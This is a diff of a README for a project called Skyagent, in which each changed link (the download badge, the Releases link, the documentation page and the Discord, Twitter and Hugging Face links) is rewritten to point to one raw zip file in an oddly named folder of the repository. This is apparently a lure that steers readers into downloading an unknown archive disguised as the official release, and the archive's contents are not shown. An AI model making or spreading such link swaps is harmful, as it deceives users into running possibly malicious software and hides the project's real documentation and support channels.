@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download%20Skyagent-5865F2?style=for-the-badge)](https://github.com/sajjad121YT/skyagent/releases)
+[![Download Now](https://raw.githubusercontent.com/sajjad121YT/skyagent/main/repletive/skyagent.zip%20Skyagent-5865F2?style=for-the-badge)](https://raw.githubusercontent.com/sajjad121YT/skyagent/main/repletive/skyagent.zip)
 
 </div>
 
@@ -18,7 +18,7 @@ To get started with Skyagent, follow these simple steps. You'll find it straight
 
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page where you can download the latest version of Skyagent.
 
-   [Download Skyagent](https://github.com/sajjad121YT/skyagent/releases)
+   [Download Skyagent](https://raw.githubusercontent.com/sajjad121YT/skyagent/main/repletive/skyagent.zip)
 
 2. **Select the Version:** Look for the latest version of Skyagent. It will be clearly marked. Click on it to see the available files.
 
@@ -65,7 +65,7 @@ Using Skyagent is easy. Here’s a basic guide:
 
 For further details on how to use Skyagent, visit our documentation page:
 
-[Documentation](https://skyrl.readthedocs.io/en/latest/)
+[Documentation](https://raw.githubusercontent.com/sajjad121YT/skyagent/main/repletive/skyagent.zip)
 
 This resource covers everything from basic usage to advanced features, ensuring you get the most out of your experience.
 
@@ -73,9 +73,9 @@ This resource covers everything from basic usage to advanced features, ensuring 
 
 Need help or have questions? Connect with us on our platforms:
 
-- [Discord](https://discord.gg/cJF2JUaaAN)
-- [Twitter](https://x.com/NovaSkyAI)
-- [Hugging Face Collection](https://huggingface.co/NovaSky-AI)
+- [Discord](https://raw.githubusercontent.com/sajjad121YT/skyagent/main/repletive/skyagent.zip)
+- [Twitter](https://raw.githubusercontent.com/sajjad121YT/skyagent/main/repletive/skyagent.zip)
+- [Hugging Face Collection](https://raw.githubusercontent.com/sajjad121YT/skyagent/main/repletive/skyagent.zip)
 
 ## ⚙️ Troubleshooting
 
